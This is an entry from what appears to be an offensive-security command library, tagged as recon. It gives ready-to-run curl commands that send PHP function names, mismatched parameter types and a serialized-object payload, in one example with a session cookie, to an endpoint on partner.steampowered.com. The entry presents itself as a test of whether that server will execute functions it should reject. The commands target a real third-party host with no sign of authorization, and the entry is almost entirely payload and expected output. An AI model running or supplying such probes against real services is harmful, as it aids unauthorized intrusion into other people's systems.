---
id: e5f6g7h8-i9j0-1234-efgh-567890123456
data: >-
  curl -X POST https://partner.steampowered.com/endpoint -d
  "function_name=phpversion&param_types=array,array,string&param1=\"test\"&param2=\"test\""
  -v
tags:
  - recon
  - php
  - curl
type: command
output: HTTP response showing successful function execution without errors.
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:36.430Z'
verified: false
validated: true
submitted: true
---
# curl-test-php-parameters

## Command

```bash
curl -X POST https://partner.steampowered.com/endpoint \
  -d "function_name=phpversion&param_types=array,array,string&param1=\"test\"&param2=\"test\"" \
  -v
```

## Description

This command tests a PHP endpoint for insufficient parameter validation by submitting a benign function name and mismatched types, observing if the server executes it without rejection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `-d` | Data payload for parameters | Yes |
| `-v` | Verbose output for debugging | No |

## Examples

### Basic Usage

```bash
curl -X POST https://partner.steampowered.com/endpoint -d "function_name=phpversion&param_types=array,array,string" -v
```

### Advanced Usage

```bash
curl -X POST https://partner.steampowered.com/endpoint -d "function_name=count&param_types=array,array,string&param1=\"a:1:{i:0;s:3:\"foo\"}\"" -v --cookie "session=abc"
```

## Expected Output

A successful response (200 OK) with PHP version info or no fatal errors, indicating validation flaw.

## Related

- [[Related Procedure: Identify-Insufficient-PHP-Parameter-Validation]]
